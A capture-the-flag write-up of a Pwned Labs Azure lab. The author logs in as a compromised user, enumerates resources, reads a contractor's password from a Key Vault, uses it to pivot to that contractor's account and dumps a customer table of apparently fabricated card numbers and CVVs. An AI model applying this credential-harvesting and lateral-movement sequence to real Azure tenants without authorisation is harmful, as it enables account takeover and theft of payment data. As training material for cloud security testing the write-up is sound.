---
title: Unlock Access with Azure Key Vault
description: Unlock Access with Azure Key Vault
image:
  path: azure.webp
categories:
- Pwned Labs
- Azure
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/azure/
tags:
- pwnedlabs
- azure
- cloud
---
# Scenario
After successfully compromising the Azure user account `marcus@megabigtech.com` and gaining access to their cloud environment, Mega Big Tech have asked us to see how far we can penetrate into the cloud environment, and if we can access any confidential data. Specifically they need us to assess the security of resources associated with the Azure Subscription ID `ceff06cb-e29d-4486-a3ae-eaaec5689f94`.

Azure Key Vaults, which store sensitive data like secrets and certificates, are high-value targets for attackers aiming to compromise multiple services. Additionally, high-privileged contractor accounts that aren't properly managed pose a risk for privilege escalation and are also attractive targets for attackers.

Entra ID (previously Azure AD) is the identity provider for Azure subscriptions, meaning it governs who has access to resources within a subscription. In Azure, multiple subscriptions can trust the same Entra ID directory, allowing for centralized management of resources and users.

An Azure subscription is a logical unit of Azure services that is linked to an Azure account. It serves as a single billing unit for Azure resources consumed and provides an isolated environment for resource management. Each Azure subscription has its own set of resource groups, resources, Azure Resource Manager templates, role-based access control policies, and billing settings.

# Walkthrough
We are given credentials for `marcus`, let's login `az login`

![](unlock-access-with-azure-key-vault-1.png)

```
└─PS> az login
A web browser has been opened at https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize. Please continue the login in the web browser. If no web browser is available or if the web browser fails to open, use device code flow with `az login --use-device-code`.

Retrieving tenants and subscriptions for the selection...

[Tenant and subscription selection]

No     Subscription name            Subscription ID                       Tenant
-----  ---------------------------  ------------------------------------  -----------------
[1] *  Microsoft Azure Sponsorship  ceff06cb-e29d-4486-a3ae-eaaec5689f94  Default Directory

The default is marked with an *; the default tenant is 'Default Directory' and subscription is 'Microsoft Azure Sponsorship' (ceff06cb-e29d-4486-a3ae-eaaec5689f94).

Select a subscription and tenant (Type a number or Enter for no changes): 

Tenant: Default Directory
Subscription: Microsoft Azure Sponsorship (ceff06cb-e29d-4486-a3ae-eaaec5689f94)

[Announcements]
With the new Azure CLI login experience, you can select the subscription you want to use more easily. Learn more about it and its configuration at https://go.microsoft.com/fwlink/?linkid=2271236

If you encounter any problem, please open an issue at https://aka.ms/azclibug

[Warning] The login output has been updated. Please be aware that it no longer displays the full list of available subscriptions by default.
```

We successfully authenticated, we can confirm it. We can see tenant ID (`2590ccef-687d-493b-ae8d-441cbab63a72`) and subscription ID (`ceff06cb-e29d-4486-a3ae-eaaec5689f94`). 
```
└─PS> az account show                                                                                                                                                                                                                       
{
  "environmentName": "AzureCloud",
  "homeTenantId": "2590ccef-687d-493b-ae8d-441cbab63a72",
  "id": "ceff06cb-e29d-4486-a3ae-eaaec5689f94",
  "isDefault": true,
  "managedByTenants": [],
  "name": "Microsoft Azure Sponsorship",
  "state": "Enabled",
  "tenantDefaultDomain": "megabigtech.com",
  "tenantDisplayName": "Default Directory",
  "tenantId": "2590ccef-687d-493b-ae8d-441cbab63a72",
  "user": {
    "name": "marcus@megabigtech.com",
    "type": "user"
  }
}

```

Next, we need to work with:
- `Microsoft Graph` - provides a unified management layer to create, update, and delete Azure resources (e.g., virtual machines, storage accounts, networks) across subscriptions
- `Azure Resource Manager`- is a unified API gateway for querying and managing data across Microsoft 365 services (e.g., Azure Active Directory, Exchange, Teams, OneDrive)
```
> Install-Module Microsoft.Graph
> Install-Module Az
> Import-Module Microsoft.Graph.Users
> Import-Module Az
> Connect-MgGraph
> Connect-AzAccount
```

After connecting to Graph, we can check our session details
```
└─PS> Connect-MgGraph
Welcome to Microsoft Graph!

Connected via delegated access using 14d82eec-204b-4c2f-b7e8-296a70dab67e
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message
```
```
└─PS> Get-MgContext

ClientId               : 14d82eec-204b-4c2f-b7e8-296a70dab67e
TenantId               : 2590ccef-687d-493b-ae8d-441cbab63a72
Scopes                 : {Application.ReadWrite.All, AuditLog.Read.All, Directory.AccessAsUser.All, Directory.Read.All…}
AuthType               : Delegated
TokenCredentialType    : InteractiveBrowser
CertificateThumbprint  : 
CertificateSubjectName : 
SendCertificateChain   : False
Account                : marcus@megabigtech.com
AppName                : Microsoft Graph Command Line Tools
ContextScope           : CurrentUser
Certificate            : 
PSHostVersion          : 7.5.1
ManagedIdentityId      : 
ClientSecret           : 
Environment            : Global
```


We can also perform `whoami` with `azure cli`
```
└─PS>  az ad signed-in-user show                                                                                                                                                                                                            
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users/$entity",
  "businessPhones": [],
  "displayName": "Marcus Hutch",
  "givenName": "Marcus",
  "id": "41c178d3-c246-4c00-98f0-8113bd631676",
  "jobTitle": "Flag: 39c6217c4a28ba7f3198e5542f9e50c4",
  "mail": null,
  "mobilePhone": null,
  "officeLocation": null,
  "preferredLanguage": null,
  "surname": "Hutch",
  "userPrincipalName": "marcus@megabigtech.com"
}

```

Since we connected to Graph, we can retrieve group membership of the user
```
└─PS> Get-MgUserMemberOf -userid "marcus@megabigtech.com" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}                                                                          

$_.AdditionalProperties["displayName"]
--------------------------------------
Directory Readers
Default Directory

```



We can check if user can access azure resources. 

```
└─PS> $CurrentSubscriptionID = "ceff06cb-e29d-4486-a3ae-eaaec5689f94"                                                                                                                                                                       
```
```
└─PS> $OutputFormat = "table" 
```
```
└─PS> az account set --subscription $CurrentSubscriptionID
```
```
└─PS> az resource list -o $OutputFormat                                                                                                                                                                                                     
Name             ResourceGroup     Location    Type                       Status
---------------  ----------------  ----------  -------------------------  --------
ext-contractors  content-static-2  eastus      Microsoft.KeyVault/vaults
```

We can see that we can access Azure Key Vault named `ext-contractors`. [Azure Key Vault](https://learn.microsoft.com/en-us/azure/key-vault/general/overview) provides a secure and centralized storage solution for cryptographic keys and secrets, such as passwords, certificates and keys used for encryption.

We also can enumerate access via the Azure Portal: https://portal.azure.com/

![](unlock-access-with-azure-key-vault-2.png)

Available resources can be viewed in `All resources` page

![](unlock-access-with-azure-key-vault-3.png)

We can list the content via CLI or via portal page
```
└─PS> az keyvault secret list --vault-name "ext-contractors" -o json                                                                                                                                                                        
[
  {
    "attributes": {
      "created": "2023-10-23T17:13:13+00:00",
      "enabled": true,
      "expires": null,
      "notBefore": null,
      "recoverableDays": 90,
      "recoveryLevel": "Recoverable+Purgeable",
      "updated": "2023-10-23T17:13:13+00:00"
    },
    "contentType": null,
    "id": "https://ext-contractors.vault.azure.net/secrets/alissa-suarez",
    "managed": null,
    "name": "alissa-suarez",
    "tags": {}
  },
  {
    "attributes": {
      "created": "2023-10-23T17:12:32+00:00",
      "enabled": true,
      "expires": null,
      "notBefore": null,
      "recoverableDays": 90,
      "recoveryLevel": "Recoverable+Purgeable",
      "updated": "2023-10-23T17:12:32+00:00"
    },
    "contentType": null,
    "id": "https://ext-contractors.vault.azure.net/secrets/josh-harvey",
    "managed": null,
    "name": "josh-harvey",
    "tags": {}
  },
  {
    "attributes": {
      "created": "2023-10-23T17:14:12+00:00",
      "enabled": true,
      "expires": null,
      "notBefore": null,
      "recoverableDays": 90,
      "recoveryLevel": "Recoverable+Purgeable",
      "updated": "2023-10-23T17:14:12+00:00"
    },
    "contentType": null,
    "id": "https://ext-contractors.vault.azure.net/secrets/ryan-garcia",
    "managed": null,
    "name": "ryan-garcia",
    "tags": {}
  }
]

```

![](unlock-access-with-azure-key-vault-4.png)


We see 3 entries for: `alissa-suarez`, `josh-harvey` and `ryan-garcia`. We can check if any of those users have Entra ID account. 
```
└─PS> az ad user list --query "[?givenName=='Alissa' || givenName=='Josh' || givenName=='Ryan'].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}" -o table                                                                      
Name                      UPN                              JobTitle
------------------------  -------------------------------  ------------------------------------------
Josh Harvey (Consultant)  ext.josh.harvey@megabigtech.com  Consultant (Customer DB Migration Project)
```

Seems like Josh has one. We can also see that he's a member of `CUSTOMER-DATABASE-ACCESS` group
```
└─PS> get-MgUserMemberOf -userid "ext.josh.harvey@megabigtech.com" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}                                                                 

$_.AdditionalProperties["displayName"]
--------------------------------------
CUSTOMER-DATABASE-ACCESS
Directory Readers
Default Directory
```

Let's retrieve Josh's secret
```
└─PS> az keyvault secret show --name "josh-harvey" --vault-name "ext-contractors" -o json                                                                                                                                                   
{
  "attributes": {
    "created": "2023-10-23T17:12:32+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoverableDays": 90,
    "recoveryLevel": "Recoverable+Purgeable",
    "updated": "2023-10-23T17:12:32+00:00"
  },
  "contentType": null,
  "id": "https://ext-contractors.vault.azure.net/secrets/josh-harvey/c5ec280997564e6da42d44797980c052",
  "kid": null,
  "managed": null,
  "name": "josh-harvey",
  "tags": {},
  "value": "<REDACTED>"
}

```

Login as Josh and check his roles (need to login via azure cli and also `Connect-AzAccount`)
```
└─PS> Get-AzRoleAssignment -Scope "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94" | Select-Object DisplayName, RoleDefinitionName                                                                                                     

DisplayName              RoleDefinitionName
-----------              ------------------
Ian Austin               Key Vault Administrator
Marcus Hutch             Key Vault Reader
Marcus Hutch             Key Vault Secrets User
Josh Harvey (Consultant) Reader
CUSTOMER-DATABASE-ACCESS Customer Database Access
IT-HELPDESK              Reader
Clara Miller             Reader
dbuser                   Reader
Ian Austin               Storage Blob Data Owner
Ian Austin               Storage Blob Data Owner
```

We can confirm that Josh has `reader` role. We can check role's permissions, where it shows that we list storage tables and values
```
└─PS> az role definition list --custom-role-only true --query "[?roleName=='Customer Database Access']" -o json                                                                                                                             
[
  {
    "assignableScopes": [
      "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/content-static-2"
    ],
    "createdBy": "18600f1a-3cee-434e-860f-aff4078da055",
    "createdOn": "2023-10-23T22:42:46.587891+00:00",
    "description": "Provides access to the Mega Big Tech customer list and information about customers",
    "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/providers/Microsoft.Authorization/roleDefinitions/53c88309-94d8-4b15-9c6b-f64a166f4ef0",
    "name": "53c88309-94d8-4b15-9c6b-f64a166f4ef0",
    "permissions": [
      {
        "actions": [
          "Microsoft.Storage/storageAccounts/tableServices/tables/read"
        ],
        "condition": null,
        "conditionVersion": null,
        "dataActions": [
          "Microsoft.Storage/storageAccounts/tableServices/tables/entities/read"
        ],
        "notActions": [],
        "notDataActions": []
      }
    ],
    "roleName": "Customer Database Access",
    "roleType": "CustomRole",
    "type": "Microsoft.Authorization/roleDefinitions",
    "updatedBy": "18600f1a-3cee-434e-860f-aff4078da055",
    "updatedOn": "2023-10-24T14:10:35.955569+00:00"
  }
]

```

Let's retrieve
```
└─PS> az storage account list --query "[].name" -o tsv
custdatabase
mbtwebsite
securityconfigs


```

List tables in `custdatabase`. We can see `customers` table
```
└─PS> az storage table list --account-name custdatabase --output table --auth-mode login                                                                                                                                                    
Name
---------
customers

```

Let's retrieve the content
```
└─PS> az storage entity query --table-name customers --account-name custdatabase --output table --auth-mode login                                                                                                                           
PartitionKey    RowKey    Card_expiry    Card_number       Customer_id                           Customer_name                           Cvv
--------------  --------  -------------  ----------------  ------------------------------------  --------------------------------------  -----
1               1         10/30          5425233430109903  07244ad0-c228-43d8-a48e-1846796aa6ad  SecureBank Holdings                     543
1               10        01/30          4347866885036101  cba21bec-7e8d-4394-a145-ea7f6131a998  InnoVenture                             781
1               2         09/29          4012000033330026  66d7a744-5eb6-4b1b-9e70-a36824366534  NeuraHealth                             452
1               3         05/31          4657490028942036  6a88c0ff-b79c-4842-92f1-f25d53c5cbe4  DreamScreen Entertainment               683
1               4         01/29          4657493919180161  14fb331d-a82e-41f8-8f20-d630f312dd3e  InfiNet Solutions                       855
1               5         08/29          4657490203402673  cdf53341-b806-4f69-a1e2-7b632b1d405d  Skyward Aerospace                       344
1               6         12/30          4594045518310163  c6e6418b-fc4e-4f7b-a463-1a3bc6551cd3  Quasar Analytics Inc                    145
1               7         02/29          4594055970518286  fc4f9042-5b94-4a79-b18a-40fa621fe2e1  DataGuard Inc                           243
1               8         06/30          4698558990398121  07a2cfae-16de-41a9-af51-b9cd9f077800  Huge Logistics                          546
1               9         03/30          4698559508013566  512df22d-815f-4f98-92af-a615a92ea39d  SmartMove Robotics                      992
1               99                                                                               Flag: <REDACTED>


```

![](unlock-access-with-azure-key-vault-5.png)
